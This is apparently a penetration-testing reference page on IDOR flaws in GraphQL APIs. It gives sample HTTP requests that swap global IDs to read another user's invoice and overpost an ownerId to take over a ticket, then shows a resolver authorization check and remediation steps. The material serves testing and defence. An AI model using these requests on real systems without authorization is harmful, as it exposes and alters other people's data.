# IDOR – GraphQL / Alt-Protocol

## Summary
Global IDs (`nodeId`), aliases, or nested selections return/modify non-owned objects when authorization is absent in resolvers.

## Discovery
- Swap global IDs; inspect nested edges/fields for leakage
- Try mutations that accept `id`/`ownerId`/`accountId` fields

## Examples
**Query (global id swap)**
```http
POST /graphql HTTP/1.1
Authorization: Bearer {{A_token}}
Content-Type: application/json

{"query":"query($id:ID!){ node(id:$id){ ... on Invoice { id number owner { id } } } }","variables": {"id": "R2xvYmFsSWQ6MTAzMA=="}}
```

**Mutation (overposting owner)**
```http
POST /graphql HTTP/1.1
Authorization: Bearer {{A_token}}
Content-Type: application/json

{"query":"mutation($id:ID!,$owner:ID!){ updateTicket(id:$id,input:{ ownerId:$owner }){ id owner { id } }}","variables": {"id": "RGlkOnRpY2tldDoxMjM=", "owner": "VXNlcjo3Nw=="}}
```

## Resolver Enforcement (sketch)
```js
function resolveInvoice(root, args, ctx){
  const invoice = loadByGlobalId(args.id)
  assert(invoice.tenantId === ctx.user.tenantId && invoice.ownerId === ctx.user.id)
  return invoice
}
```

## Remediation
- Enforce authorization in each resolver/mutation
- Derive owner/tenant from context; ignore client-supplied owner/tenant fields
- Limit field selection for unprivileged roles
